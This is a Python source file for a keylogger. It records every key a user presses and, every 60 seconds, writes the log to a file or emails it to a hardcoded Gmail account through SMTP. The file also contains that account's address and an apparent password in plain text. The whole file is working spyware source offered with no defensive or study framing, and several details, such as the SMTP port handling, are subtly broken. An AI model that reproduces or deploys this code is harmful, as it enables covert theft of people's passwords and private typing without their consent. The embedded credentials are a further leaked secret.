import keyboard # for keylogger
import smtplib # for email sending using SMTP protocol 
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#-----------------------------------------------------------

SEND_REPORT_EVERY = 60 # seconds
EMAIL_ADRESS = "wtnhaseoreireys@gmail.com"
EMAIL_PASSWORD = "ddtank10queiroz"

#-----------------------------------------------------------

class keylogger:
  def __init__(self, interval, report_method="email"):
    self.interval = interval
    self.report_method = report_method

    self.log = ''

    self.start_dt = datetime.now()
    self.end_dt = datetime.now()


  def callback(self, event):
    name = event.name

    if len(name) > 1:
      if name == " ":
        name = " "

      elif name == "enter":
        name = "[enter]\n"

      elif name == "decimal":
        name = "."

      else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += name


  def update_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", " ")
    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"



  def report_to_file(self):
    with open(f"{self.filename}.txt", "w") as f:
      print(self.log, file=f)
    print(f"[+] Saved {self.filename}.txt")



  def prepare_mail(self, message):
    msg = MIMEMultipart("alternative")
    msg["From"] = EMAIL_ADRESS
    msg["To"] = EMAIL_ADRESS
    msg["Subject"] = "keylogger logs"

    html = f"<p>{msg}</p>"

    text_part = MIMEText(message, "plain")
    html_part = MIMEText(html, "html")

    msg.attach(text_part)
    msg.attach(html_part)

    return msg.as_string()



  def sendmail(self, email, password, message, verbose=1):
    server = smtplib.SMTP(host="smtp.gmail.com", port=465)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, self.prepare_mail(message))
    server.quit()

    if verbose:
      print(f"{datetime.now()} - Sent an email to {email} containing: {message}")


  def report(self):
    if self.log:
      self.end_dt = datetime.now()
      self.update_filename()

      if self.report_method == "email":
        self.sendmail(EMAIL_ADRESS, EMAIL_PASSWORD, self.log)

      elif self.report_method == "file":
        self.report_to_file()

      print(f"{self.filename} - {self.log}")

      self.start_dt = datetime.now()

    self.log = ""

    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()



  def start(self):
    self.start_dt = datetime.now() # record the start datetime

    keyboard.on_release(callback=self.callback) # start the keylogger

    self.report() # start reporting the keylogger

    print(f"{datetime.now()} - Started keylogger")

    keyboard.wait() #block until CTRL+C is pressed

if __name__ == "__main__":
  # for email
  #keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="email")

  #for file
  keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="file")

  keylogger.start()
